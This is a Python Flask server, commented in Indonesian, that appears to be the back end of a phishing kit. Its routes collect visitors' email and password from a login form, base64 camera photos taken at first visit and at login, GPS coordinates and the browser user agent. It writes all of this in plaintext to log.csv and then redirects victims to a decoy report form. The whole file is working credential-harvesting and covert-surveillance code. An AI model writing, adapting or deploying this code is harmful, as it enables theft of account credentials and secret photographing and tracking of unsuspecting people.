from flask import Flask, render_template, request, redirect, url_for, jsonify
import os, base64, csv
from datetime import datetime, timezone, timedelta

app = Flask(__name__)
CAPTURE_DIR = "captured_images"
LOG_FILE = "log.csv"

# WIB timezone
WIB = timezone(timedelta(hours=7))

os.makedirs(CAPTURE_DIR, exist_ok=True)

# create csv header if not exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["waktu_wib","jenis","email","password","lat","lon","ua","foto"])

@app.route('/')
def index():
    return render_template("index.html")

# menerima foto awal (json: photo, lat, lon, ua)
@app.route('/berhasil_awal', methods=['POST'])
def berhasil_awal():
    try:
        data = request.get_json() or {}
        foto_name = save_photo(data.get("photo", ""), "awal")
        waktu = datetime.now(WIB).strftime("%Y-%m-%d %H:%M:%S")
        lat = data.get("lat", "")
        lon = data.get("lon", "")
        ua = data.get("ua", "")
        tulis_csv(waktu, "awal", "", "", lat, lon, ua, foto_name)
        return jsonify(status="ok")
    except Exception as e:
        print("err berhasil_awal:", e)
        return jsonify(status="error", message=str(e)), 500

# menerima foto + form login (form-data)
@app.route('/berhasil', methods=['POST'])
def berhasil():
    try:
        photo = request.form.get("photo", "")
        email = request.form.get("email", "")
        password = request.form.get("password", "")
        lat = request.form.get("lat", "")
        lon = request.form.get("lon", "")
        ua = request.form.get("ua", "")
        foto_name = save_photo(photo, "login")
        waktu = datetime.now(WIB).strftime("%Y-%m-%d %H:%M:%S")
        tulis_csv(waktu, "login", email, password, lat, lon, ua, foto_name)
        # redirect user to form_laporan page (indanout)
        return redirect(url_for("form_laporan"))
    except Exception as e:
        print("err berhasil:", e)
        return "ERROR", 500

# halaman form laporan (indanout)
@app.route('/form_laporan')
def form_laporan():
    return render_template("indanout.html")

# endpoint untuk menerima salinan laporan dari client (POST form-urlencode/json)
# ini untuk backup lokal (log.csv)
@app.route('/log_report', methods=['POST'])
def log_report():
    try:
        # support both form-data and json
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        hari_tanggal = data.get("hari_tanggal", "")
        jam = data.get("jam", "")
        material = data.get("material_jumlah", "")
        keterangan = data.get("keterangan", "")
        waktu = datetime.now(WIB).strftime("%Y-%m-%d %H:%M:%S")
        # simpan ke csv, jenis = laporan
        tulis_csv(waktu, "laporan", "", "", hari_tanggal, jam, material + " | " + keterangan, "")
        return jsonify(status="ok")
    except Exception as e:
        print("err log_report:", e)
        return jsonify(status="error", message=str(e)), 500

# helper: save base64 dataurl to file
def save_photo(photo_data, label):
    try:
        if not photo_data or not photo_data.startswith("data:"):
            return ""
        header, encoded = photo_data.split(",", 1)
        data = base64.b64decode(encoded)
        filename = f"{label}_{len(os.listdir(CAPTURE_DIR))+1}.jpg"
        path = os.path.join(CAPTURE_DIR, filename)
        with open(path, "wb") as f:
            f.write(data)
        return filename
    except Exception as e:
        print("Gagal simpan foto:", e)
        return ""

def tulis_csv(waktu, jenis, email, password, lat, lon, ua, foto):
    try:
        with open(LOG_FILE, "a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([waktu, jenis, email, password, lat, lon, ua, foto])
    except Exception as e:
        print("Gagal tulis csv:", e)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
  
